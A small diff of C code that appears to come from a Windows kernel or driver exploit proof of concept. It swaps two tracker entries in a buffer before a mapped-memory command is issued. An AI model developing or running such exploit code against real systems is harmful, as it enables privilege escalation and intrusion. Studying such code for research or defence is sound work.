@@ -123,8 +123,8 @@ int main(int argc, TCHAR* argv[])
     }
 
     printf("[+] Bind Tracker to the First TrackerBinding\n");
-    szBuff[0] = TrackerBinding1;
-    szBuff[1] = Tracker2;
+    szBuff[0] = Tracker2;
+    szBuff[1] = TrackerBinding1;
 
     UINT datasize = 0x8; // Size == 0x10
     *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
